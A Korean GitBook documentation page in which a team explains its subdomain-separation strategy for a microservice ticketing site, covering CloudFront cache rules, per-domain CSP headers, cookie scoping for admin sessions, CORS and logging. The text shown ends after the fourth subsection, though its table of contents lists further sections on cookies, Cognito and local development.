
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <title>MSA 환경에서 쿠키 기반 인증을 선택한 이유 · 공연 티켓팅 서비스 GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="HonKit 6.0.3">
        
        
        
    
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-mermaid-gb3/mermaid/mermaid.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/@honkit/honkit-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/@honkit/honkit-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    


    
        
        
        <link rel="stylesheet" href="../gitbook/gitbook-plugin-mermaid-gb3/mermaid/mermaid.default.css" />
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../11-infra/CICD.html" />
    
    
    <link rel="prev" href="seat-lock-structure.html" />
    

    </head>
    <body>
        
<div class="book honkit-cloak">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    소개
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Intro</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../01-intro/01-overview.html">
            
                <a href="../01-intro/01-overview.html">
            
                    
                    주제 선정 이유 및 기대 효과
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../01-intro/template-example.html">
            
                <a href="../01-intro/template-example.html">
            
                    
                    template 가이드
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../01-intro/template.html">
            
                <a href="../01-intro/template.html">
            
                    
                    template
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Goals</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../02-goals/01-mvp.html">
            
                <a href="../02-goals/01-mvp.html">
            
                    
                    프로젝트 목표 및 구현 계획
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Conventions</li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../03-conventions/01-standards.html">
            
                <a href="../03-conventions/01-standards.html">
            
                    
                    공통 규칙(컨벤션)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../03-conventions/02-issue-template.html">
            
                <a href="../03-conventions/02-issue-template.html">
            
                    
                    GitHub Issue Template 생성 및 활용 가이드
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.3" data-path="../03-conventions/github-project-v1.html">
            
                <a href="../03-conventions/github-project-v1.html">
            
                    
                    GitHub 프로젝트 관리 가이드 (v1)
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Architecture</li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="../04-architecture/C4-model.html">
            
                <a href="../04-architecture/C4-model.html">
            
                    
                    C4 Model
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Frontend</li>
        
        
    
        <li class="chapter " data-level="6.1" data-path="../06-frontend/frontend-migration.html">
            
                <a href="../06-frontend/frontend-migration.html">
            
                    
                    Frontend Migration
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Backend</li>
        
        
    
        <li class="chapter " data-level="7.1" data-path="02-springboot-setting.html">
            
                <a href="02-springboot-setting.html">
            
                    
                    Spring Boot 세팅
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.2" data-path="03-test-CRUD-controller.html">
            
                <a href="03-test-CRUD-controller.html">
            
                    
                    [실습] test CRUD controller 만들기
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.3" data-path="04-springboot-folder-structure.html">
            
                <a href="04-springboot-folder-structure.html">
            
                    
                    Folder Structure in SpringBoot
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.4" data-path="05-springboot-utils-error.html">
            
                <a href="05-springboot-utils-error.html">
            
                    
                    Error 처리 공통 클래스 in Spring Boot
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.5" data-path="06-springboot-actuator.html">
            
                <a href="06-springboot-actuator.html">
            
                    
                    Spring Boot Actuator
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.6" data-path="queue-structure.html">
            
                <a href="queue-structure.html">
            
                    
                    티켓팅 시스템 대기열(Queue)
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="7.7" data-path="seat-lock-structure.html">
            
                <a href="seat-lock-structure.html">
            
                    
                    좌석 락 시스템 가이드
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="7.8" data-path="why-cookie-based-auth.html">
            
                <a href="why-cookie-based-auth.html">
            
                    
                    MSA 환경에서 쿠키 기반 인증을 선택한 이유
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Infra</li>
        
        
    
        <li class="chapter " data-level="8.1" data-path="../11-infra/CICD.html">
            
                <a href="../11-infra/CICD.html">
            
                    
                    CICD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="8.2" data-path="../11-infra/cognito-infra-setup.html">
            
                <a href="../11-infra/cognito-infra-setup.html">
            
                    
                    AWS Cognito 인증 시스템 구축 가이드
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://github.com/honkit/honkit" target="blank" class="gitbook-link">
            Published with HonKit
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >MSA 환경에서 쿠키 기반 인증을 선택한 이유</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="msa-환경에서-쿠키-기반-인증을-선택한-이유">MSA 환경에서 쿠키 기반 인증을 선택한 이유</h1>
<h2 id="목차">목차</h2>
<ul>
<li><a href="#프로젝트-배경">프로젝트 배경</a></li>
<li><a href="#도메인-분리-전략">도메인 분리 전략</a></li>
<li><a href="#인증-저장소-비교-쿠키-vs-로컬스토리지">인증 저장소 비교: 쿠키 vs 로컬스토리지</a></li>
<li><a href="#쿠키-선택의-기술적-근거">쿠키 선택의 기술적 근거</a></li>
<li><a href="#aws-cognito-선택-이유">AWS Cognito 선택 이유</a></li>
<li><a href="#cognito-인증-방식-비교">Cognito 인증 방식 비교</a></li>
<li><a href="#로컬-개발-환경의-제약과-해결">로컬 개발 환경의 제약과 해결</a></li>
<li><a href="#주의사항-및-best-practices">주의사항 및 Best Practices</a></li>
</ul>
<hr></hr>
<h2 id="프로젝트-배경">프로젝트 배경</h2>
<h3 id="아키텍처-전환">아키텍처 전환</h3>
<p>2차 프로젝트에서 우리 팀은 <strong>모놀리식 아키텍처에서 MSA(Microservices Architecture)로의 전환</strong>을 진행하고 있습니다. 이를 위해 기존 단일 서비스를 다음과 같이 분리했습니다:</p>
<pre><code class="lang-yaml"><span class="hljs-string">기존</span> <span class="hljs-string">아키텍처:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">단일</span> <span class="hljs-string">Spring</span> <span class="hljs-string">Boot</span> <span class="hljs-string">애플리케이션</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">모든</span> <span class="hljs-string">기능이</span> <span class="hljs-string">하나의</span> <span class="hljs-string">서버에</span> <span class="hljs-string">통합</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">Path</span> <span class="hljs-string">기반</span> <span class="hljs-string">라우팅</span> <span class="hljs-string">(/admin,</span> <span class="hljs-string">/queue,</span> <span class="hljs-string">/api</span> <span class="hljs-string">등)</span>

<span class="hljs-string">새로운</span> <span class="hljs-string">아키텍처:</span>
  <span class="hljs-string">서비스</span> <span class="hljs-string">분리:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">Queue Service:</span> <span class="hljs-string">대기열</span> <span class="hljs-string">관리</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">Admin Service:</span> <span class="hljs-string">관리자</span> <span class="hljs-string">기능</span> <span class="hljs-string">(Lambda</span> <span class="hljs-string">서버리스)</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">Core Service:</span> <span class="hljs-string">나머지</span> <span class="hljs-string">핵심</span> <span class="hljs-string">비즈니스</span> <span class="hljs-string">로직</span>

  <span class="hljs-string">도메인</span> <span class="hljs-string">분리:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">ddcn41.com:</span> <span class="hljs-string">메인</span> <span class="hljs-string">클라이언트</span> <span class="hljs-string">서비스</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">accounts.ddcn41.com:</span> <span class="hljs-string">인증</span> <span class="hljs-string">및</span> <span class="hljs-string">계정</span> <span class="hljs-string">관리</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">admin.ddcn41.com:</span> <span class="hljs-string">관리자</span> <span class="hljs-string">대시보드</span>
</code></pre>
<h3 id="전환-목표">전환 목표</h3>
<ul>
<li><strong>운영 경계 명확화</strong>: 각 서비스의 책임과 범위를 명확히 구분</li>
<li><strong>보안 강화</strong>: 서비스별 독립적인 보안 정책 적용</li>
<li><strong>확장성 향상</strong>: 서비스별 독립적인 스케일링</li>
<li><strong>유지보수성 개선</strong>: 서비스 간 결합도 감소</li>
</ul>
<hr></hr>
<h2 id="도메인-분리-전략">도메인 분리 전략</h2>
<h3 id="서브도메인-분리의-이유">서브도메인 분리의 이유</h3>
<h4 id="1-cdn-및-캐시-정책-최적화">1. CDN 및 캐시 정책 최적화</h4>
<p><strong>문제 상황</strong>:</p>
<pre><code>기존 (Path 기반):
  ddcn41.com/admin  → 관리자 페이지 (캐시 불가)
  ddcn41.com/api    → API 엔드포인트 (캐시 불가)
  ddcn41.com/       → 정적 리소스 (캐시 가능)

→ 모든 경로가 같은 도메인이므로 CDN 캐시 정책 설정 어려움
</code></pre><p><strong>Path 기반 캐시 정책의 한계</strong>⁵:</p>
<p>CloudFront에서 Path 패턴별로 캐시 정책을 다르게 설정할 수는 있지만, <strong>운영 복잡도와 실수 가능성</strong>이 높습니다:</p>
<pre><code class="lang-yaml"><span class="hljs-comment"># CloudFront Behavior 설정 (Path 기반)</span>
<span class="hljs-attr">Behaviors:</span>
  <span class="hljs-comment"># 정적 파일 캐싱</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">PathPattern:</span> <span class="hljs-string">"/"</span>
    <span class="hljs-attr">CachingOptimized:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">TTL:</span> <span class="hljs-number">86400</span>  <span class="hljs-comment"># 1일</span>

  <span class="hljs-comment"># API 캐싱 비활성화</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">PathPattern:</span> <span class="hljs-string">"/api/*"</span>
    <span class="hljs-attr">CachingDisabled:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">TTL:</span> <span class="hljs-number">0</span>

  <span class="hljs-comment"># 관리자 페이지 캐싱 비활성화</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">PathPattern:</span> <span class="hljs-string">"/admin/*"</span>
    <span class="hljs-attr">CachingDisabled:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">TTL:</span> <span class="hljs-number">0</span>

<span class="hljs-string">문제점:</span>
<span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">❌</span> <span class="hljs-string">우선순위</span> <span class="hljs-string">충돌:</span> <span class="hljs-string">PathPattern</span> <span class="hljs-string">순서에</span> <span class="hljs-string">따라</span> <span class="hljs-string">예기치</span> <span class="hljs-string">않은</span> <span class="hljs-string">동작</span> <span class="hljs-string">발생</span> <span class="hljs-string">가능</span>
   <span class="hljs-string">예)</span> <span class="hljs-string">/api/public/file.js</span> <span class="hljs-string">→</span> <span class="hljs-string">API로</span> <span class="hljs-string">인식?</span> <span class="hljs-string">정적</span> <span class="hljs-string">파일로</span> <span class="hljs-string">인식?</span>

<span class="hljs-number">2</span><span class="hljs-string">.</span> <span class="hljs-string">❌</span> <span class="hljs-string">관리</span> <span class="hljs-string">복잡도:</span> <span class="hljs-string">경로</span> <span class="hljs-string">추가</span> <span class="hljs-string">시마다</span> <span class="hljs-string">CloudFront</span> <span class="hljs-string">Behavior</span> <span class="hljs-string">수정</span> <span class="hljs-string">필요</span>
   <span class="hljs-string">예)</span> <span class="hljs-string">새</span> <span class="hljs-string">경로</span> <span class="hljs-string">/docs</span> <span class="hljs-string">추가</span> <span class="hljs-string">→</span> <span class="hljs-string">CloudFront</span> <span class="hljs-string">배포</span> <span class="hljs-string">업데이트</span> <span class="hljs-string">→</span> <span class="hljs-string">전파</span> <span class="hljs-string">대기(15분)</span>

<span class="hljs-number">3</span><span class="hljs-string">.</span> <span class="hljs-string">❌</span> <span class="hljs-string">디버깅</span> <span class="hljs-string">어려움:</span> <span class="hljs-string">캐시</span> <span class="hljs-string">문제</span> <span class="hljs-string">발생</span> <span class="hljs-string">시</span> <span class="hljs-string">어느</span> <span class="hljs-string">Behavior가</span> <span class="hljs-string">적용되었는지</span> <span class="hljs-string">추적</span> <span class="hljs-string">복잡</span>
   <span class="hljs-string">예)</span> <span class="hljs-string">캐시되지</span> <span class="hljs-string">말아야</span> <span class="hljs-string">할</span> <span class="hljs-string">/admin/config.js가</span> <span class="hljs-string">캐싱됨</span> <span class="hljs-string">→</span> <span class="hljs-string">PathPattern</span> <span class="hljs-string">우선순위</span> <span class="hljs-string">확인</span> <span class="hljs-string">필요</span>

<span class="hljs-number">4</span><span class="hljs-string">.</span> <span class="hljs-string">❌</span> <span class="hljs-string">휴먼</span> <span class="hljs-string">에러:</span> <span class="hljs-string">실수로</span> <span class="hljs-string">잘못된</span> <span class="hljs-string">경로에</span> <span class="hljs-string">캐싱</span> <span class="hljs-string">적용</span> <span class="hljs-string">시</span> <span class="hljs-string">보안</span> <span class="hljs-string">문제</span>
   <span class="hljs-string">예)</span> <span class="hljs-string">/api/users</span> <span class="hljs-string">→</span> <span class="hljs-string">캐싱</span> <span class="hljs-string">활성화</span> <span class="hljs-string">실수</span> <span class="hljs-string">→</span> <span class="hljs-string">민감</span> <span class="hljs-string">정보</span> <span class="hljs-string">엣지에</span> <span class="hljs-string">캐싱</span>
</code></pre>
<blockquote>
<p>⁵ 참조: <a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/DownloadDistValuesCacheBehavior" target="_blank">CloudFront Cache Behavior Configuration</a></p>
</blockquote>
<p><strong>서버 내부 라우팅 방식 (ddcn41.com/api → api.ddcn41.com)</strong>:</p>
<p>내부 리다이렉트나 프록시를 사용하더라도 <strong>클라이언트 관점에서는 여전히 같은 도메인</strong>이므로 캐시 정책 문제는 동일합니다:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// Nginx/ALB에서 내부 라우팅</span>
location /api {
    proxy_pass <span class="hljs-attr">https</span>:<span class="hljs-comment">//api.ddcn41.com;</span>
    <span class="hljs-comment">// ⚠️ 클라이언트는 ddcn41.com/api로 요청</span>
    <span class="hljs-comment">// ⚠️ CloudFront는 ddcn41.com에 대한 캐시 정책 적용</span>
    <span class="hljs-comment">// ⚠️ 내부적으로 api.ddcn41.com으로 프록시해도 캐시 정책은 Origin 기준</span>
}

문제점:
<span class="hljs-number">1.</span> ❌ <span class="hljs-title class_">CloudFront</span>는 요청 <span class="hljs-variable constant_">URL</span> 기준으로 캐싱 (<span class="hljs-title class_">Origin</span>이 어디든 상관없음)
   클라이언트 요청: ddcn41.<span class="hljs-property">com</span>/api/users
   → <span class="hljs-title class_">CloudFront</span>: <span class="hljs-string">"ddcn41.com에 대한 캐시 정책 적용"</span>
   → <span class="hljs-title class_">Origin</span>이 api.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>이든 상관없이 ddcn41.<span class="hljs-property">com</span>의 <span class="hljs-title class_">Behavior</span> 적용

<span class="hljs-number">2.</span> ❌ <span class="hljs-title class_">Cache</span>-<span class="hljs-title class_">Control</span> 헤더 충돌 가능
   api.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>에서 <span class="hljs-title class_">Cache</span>-<span class="hljs-title class_">Control</span>: no-cache 응답
   → <span class="hljs-title class_">CloudFront</span> <span class="hljs-title class_">Behavior</span>가 강제 캐싱 설정이면 무시됨
   → 의도치 않은 캐싱 발생

<span class="hljs-number">3.</span> ❌ <span class="hljs-title class_">Invalidation</span> 복잡도 증가
   /api<span class="hljs-comment">/* 캐시 무효화 시 ddcn41.com/* 전체에 영향 가능
</span></code></pre>
<p><strong>해결 방법 (서브도메인 분리)</strong>:</p>
<pre><code>ddcn41.com          → CloudFront + S3 (적극적 캐싱, TTL 1일)
accounts.ddcn41.com → CloudFront + S3 (적극적 캐싱, TTL 1일)
admin.ddcn41.com    → CloudFront + S3 (적극적 캐싱, TTL 1일)
api.ddcn41.com      → ALB → EC2 (캐싱 비활성화)
auth.ddcn41.com     → API Gateway → Lambda (캐싱 선택적)
</code></pre><p><strong>장점</strong>:</p>
<ul>
<li>✅ 정적 파일(HTML, CSS, JS)은 엣지 로케이션에서 적극적으로 캐싱</li>
<li>✅ API 엔드포인트는 캐싱 제외로 실시간 데이터 보장</li>
<li>✅ 도메인별 독립적인 캐시 무효화 (Invalidation)</li>
</ul>
<h4 id="2-csp-content-security-policy-헤더-관리">2. CSP (Content Security Policy) 헤더 관리</h4>
<p><strong>CSP란?</strong>
브라우저가 실행할 수 있는 리소스의 출처를 제한하는 보안 정책입니다.</p>
<p><strong>Path 기반의 문제</strong>:</p>
<pre><code class="lang-http"># 모든 경로에 동일한 CSP 적용
<span class="hljs-attribute">Content-Security-Policy</span>:
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.ddcn41.com;

→ /admin과 /client가 같은 정책을 공유하므로 세밀한 제어 불가
</code></pre>
<p><strong>서브도메인 분리 시</strong>:</p>
<pre><code class="lang-http"># admin.ddcn41.com (엄격한 정책)
<span class="hljs-attribute">Content-Security-Policy</span>:
  default-src 'self';
  script-src 'self';
  connect-src 'self' https://api.ddcn41.com

# ddcn41.com (유연한 정책)
<span class="hljs-attribute">Content-Security-Policy</span>:
  default-src 'self';
  script-src 'self' 'unsafe-inline'
    https://www.google-analytics.com    # Google Analytics
    https://www.googletagmanager.com    # Google Tag Manager
    https://connect.facebook.net        # Facebook Pixel
    https://cdn.amplitude.com;          # Amplitude 분석
  connect-src 'self'
    https://www.google-analytics.com    # Analytics 데이터 전송
    https://api.amplitude.com           # Amplitude API
    https://graph.facebook.com;         # Facebook Graph API
  img-src 'self' data: https:           # 광고 이미지 로드 허용
    https://www.google-analytics.com    # Analytics 픽셀
    https://www.facebook.com;           # Facebook 픽셀
  frame-src
    https://www.youtube.com             # YouTube 임베드
    https://player.vimeo.com;           # Vimeo 임베드
</code></pre>
<p><strong>실제 사용 사례 예시</strong>:</p>
<pre><code class="lang-http"># E-Commerce 사이트 (ddcn41.com)
<span class="hljs-attribute">Content-Security-Policy</span>:
  default-src 'self';

  # 써드파티 스크립트 (분석, 광고, 결제)
  script-src 'self' 'unsafe-inline'
    https://www.googletagmanager.com      # Google Tag Manager
    https://connect.facebook.net          # Facebook Pixel
    https://js.stripe.com                 # Stripe 결제
    https://cdn.iamport.kr;               # 아임포트 결제

  # API 통신
  connect-src 'self'
    https://api.ddcn41.com                # 자체 API
    https://api.amplitude.com             # 분석 데이터
    https://api.stripe.com                # Stripe API
    https://api.iamport.kr;               # 아임포트 API

  # 이미지 (CDN, 광고, 상품 이미지)
  img-src 'self' data: https:
    https://cdn.ddcn41.com                # 자체 CDN
    https://googleads.g.doubleclick.net;  # Google Ads

  # 외부 iframe (결제 위젯, 소셜 로그인)
  frame-src
    https://js.stripe.com                 # Stripe 결제 iframe
    https://accounts.google.com           # Google 로그인
    https://www.facebook.com;             # Facebook 로그인

# 관리자 페이지 (admin.ddcn41.com) - 엄격한 정책
<span class="hljs-attribute">Content-Security-Policy</span>:
  default-src 'self';
  script-src 'self';                      # 외부 스크립트 완전 차단
  connect-src 'self' https://api.ddcn41.com;  # 자체 API만 허용
  img-src 'self';                         # 자체 이미지만 허용
  frame-src 'none';                       # iframe 완전 차단
  object-src 'none';                      # 플러그인 차단
</code></pre>
<p><strong>장점</strong>:</p>
<ul>
<li>관리자 페이지에 더 엄격한 보안 정책 적용</li>
<li>사용자 페이지는 UX를 위해 유연한 정책 적용</li>
<li>서비스별 독립적인 CSP 관리</li>
</ul>
<h4 id="3-쿠키-및-스토리지-격리">3. 쿠키 및 스토리지 격리</h4>
<p><strong>시나리오: Admin 전용 세션 관리</strong></p>
<p>현재는 <code>.ddcn41.com</code> 도메인으로 모든 서브도메인에서 쿠키를 공유하지만, 향후 요구사항 변경 시 유연하게 대응할 수 있습니다:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 현재: 모든 서브도메인에서 쿠키 공유</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: session_token=abc123; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>; <span class="hljs-title class_">HttpOnly</span>; <span class="hljs-title class_">Secure</span>;

<span class="hljs-comment">// 향후 요구사항: Admin만 별도 관리</span>
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: admin_session=xyz789; <span class="hljs-title class_">Domain</span>=admin.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>; <span class="hljs-title class_">HttpOnly</span>; <span class="hljs-title class_">Secure</span>;
<span class="hljs-comment">// → admin.ddcn41.com에서만 접근 가능</span>
</code></pre>
<p><strong>실제 활용 예시: 로그인 페이지 분리</strong></p>
<p>고객용 로그인과 관리자 로그인을 완전히 분리하여 보안을 강화할 수 있습니다:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// 시나리오 1: 통합 로그인 (현재 방식)</span>
<span class="hljs-comment">// 장점: 단일 로그인 페이지, 편리한 사용자 경험</span>
<span class="hljs-comment">// 단점: 일반 사용자가 관리자 로그인 페이지를 알 수 있음</span>

accounts.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>/login → 모든 사용자 로그인
  ↓ 로그인 성공
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: access_token=...; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>
  → ddcn41.<span class="hljs-property">com</span>, admin.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span> 모두 접근 가능

<span class="hljs-comment">// 시나리오 2: 분리된 로그인 (향후 요구사항)</span>
<span class="hljs-comment">// 장점: 관리자 로그인 페이지 숨김, 보안 강화, IP 화이트리스트 적용</span>
<span class="hljs-comment">// 단점: 관리자는 별도 로그인 필요</span>

<span class="hljs-comment">// 고객 로그인</span>
accounts.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>/login → 일반 사용자만
  ↓ 로그인 성공
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: user_token=...; <span class="hljs-title class_">Domain</span>=.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>
  → ddcn41.<span class="hljs-property">com</span>에서만 유효

<span class="hljs-comment">// 관리자 로그인 (별도 도메인, IP 제한)</span>
admin-auth.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>/login → 관리자만 (회사 <span class="hljs-variable constant_">IP</span>에서만 접근 가능)
  ↓ 로그인 성공
<span class="hljs-title class_">Set</span>-<span class="hljs-title class_">Cookie</span>: admin_token=...; <span class="hljs-title class_">Domain</span>=admin.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>; <span class="hljs-title class_">HttpOnly</span>; <span class="hljs-title class_">Secure</span>;
  → admin.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>에서만 유효
  → 일반 사용자 영역(ddcn41.<span class="hljs-property">com</span>)에서는 절대 전송되지 않음

<span class="hljs-comment">// WAF 규칙 (관리자 보호)</span>
admin-auth.<span class="hljs-property">ddcn41</span>.<span class="hljs-property">com</span>:
  - <span class="hljs-variable constant_">IP</span> <span class="hljs-title class_">Whitelist</span>: 회사 <span class="hljs-variable constant_">IP</span>만 허용
  - <span class="hljs-title class_">Rate</span> <span class="hljs-title class_">Limiting</span>: <span class="hljs-number">5</span> req/min
  - 2FA 강제
  - 별도 <span class="hljs-title class_">Cognito</span> <span class="hljs-title class_">User</span> <span class="hljs-title class_">Pool</span>
</code></pre>
<p><strong>Cookie Scope 제어의 장점</strong>:</p>
<pre><code class="lang-yaml"><span class="hljs-string">보안</span> <span class="hljs-string">강화:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">일반</span> <span class="hljs-string">사용자가</span> <span class="hljs-string">관리자</span> <span class="hljs-string">쿠키에</span> <span class="hljs-string">절대</span> <span class="hljs-string">접근</span> <span class="hljs-string">불가</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">관리자</span> <span class="hljs-string">세션</span> <span class="hljs-string">탈취</span> <span class="hljs-string">시에도</span> <span class="hljs-string">일반</span> <span class="hljs-string">영역에서</span> <span class="hljs-string">사용</span> <span class="hljs-string">불가</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">관리자</span> <span class="hljs-string">로그인</span> <span class="hljs-string">페이지</span> <span class="hljs-string">URL을</span> <span class="hljs-string">숨길</span> <span class="hljs-string">수</span> <span class="hljs-string">있음</span>

<span class="hljs-string">운영</span> <span class="hljs-string">유연성:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">관리자</span> <span class="hljs-string">세션</span> <span class="hljs-string">타임아웃</span> <span class="hljs-string">독립</span> <span class="hljs-string">설정</span> <span class="hljs-string">(예:</span> <span class="hljs-number">30</span><span class="hljs-string">분)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">일반</span> <span class="hljs-string">사용자</span> <span class="hljs-string">세션은</span> <span class="hljs-string">긴</span> <span class="hljs-string">유지</span> <span class="hljs-string">(예:</span> <span class="hljs-number">7</span><span class="hljs-string">일)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">관리자만</span> <span class="hljs-string">MFA</span> <span class="hljs-string">강제,</span> <span class="hljs-string">IP</span> <span class="hljs-string">제한</span> <span class="hljs-string">적용</span>

<span class="hljs-string">감사</span> <span class="hljs-string">및</span> <span class="hljs-string">컴플라이언스:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">관리자</span> <span class="hljs-string">행동</span> <span class="hljs-string">로그</span> <span class="hljs-string">분리</span> <span class="hljs-string">추적</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">규정</span> <span class="hljs-string">준수</span> <span class="hljs-string">(PCI-DSS,</span> <span class="hljs-string">GDPR</span> <span class="hljs-string">등)</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">관리자</span> <span class="hljs-string">세션</span> <span class="hljs-string">모니터링</span> <span class="hljs-string">독립</span> <span class="hljs-string">운영</span>
</code></pre>
<p><strong>장점</strong>:</p>
<ul>
<li>✅ 서비스별 독립적인 인증 관리 가능</li>
<li>✅ 보안 요구사항에 따라 유연한 쿠키 스코프 설정</li>
<li>✅ 로컬스토리지도 Origin 단위로 자동 격리</li>
</ul>
<h4 id="4-기타-운영상-이점">4. 기타 운영상 이점</h4>
<p><strong>CORS 정책 관리</strong>:</p>
<pre><code class="lang-javascript"><span class="hljs-comment">// Path 기반: CORS 불필요 (Same-Origin)</span>
<span class="hljs-comment">// → 하지만 서비스 간 의존성 명확하지 않음</span>

<span class="hljs-comment">// 서브도메인 분리: 명시적 CORS 설정</span>
<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>: <span class="hljs-attr">https</span>:<span class="hljs-comment">//ddcn41.com</span>
<span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span>: <span class="hljs-attr">https</span>:<span class="hljs-comment">//admin.ddcn41.com</span>
<span class="hljs-comment">// → 서비스 간 통신 경계가 명확</span>
</code></pre>
<p><strong>모니터링 및 로깅</strong>:</p>
<pre><code class="lang-yaml"><span class="hljs-attr">CloudWatch Logs:</span>
  <span class="hljs-string">/aws/cloudfront/ddcn41.com:</span> <span class="hljs-string">Client</span> <span class="hljs-string">서비스</span> <span class="hljs-string">로그</span>
  <span class="hljs-string">/aws/cloudfront/admin.ddcn41.com:</span> <span class="hljs-string">Admin</span> <span class="hljs-string">서비스</span> <span class="hljs-string">로그</span>
  <span class="hljs-string">/aws/cloudfront/accounts.ddcn41.com:</span> <span class="hljs-string">Accounts</span> <span class="hljs-string">서비스</span> <span class="hljs-string">로그</span>

<span class="hljs-string">→</span> <span class="hljs-string">서비스별</span> <span class="hljs-string">독립적인</span> <span class="hljs-string">로그</span> <span class="hljs-string">분석</span> <span class="hljs-string">및</span> <span class="hljs-string">알람</span> <span class="hljs-string">설정</span>
</code></pre>
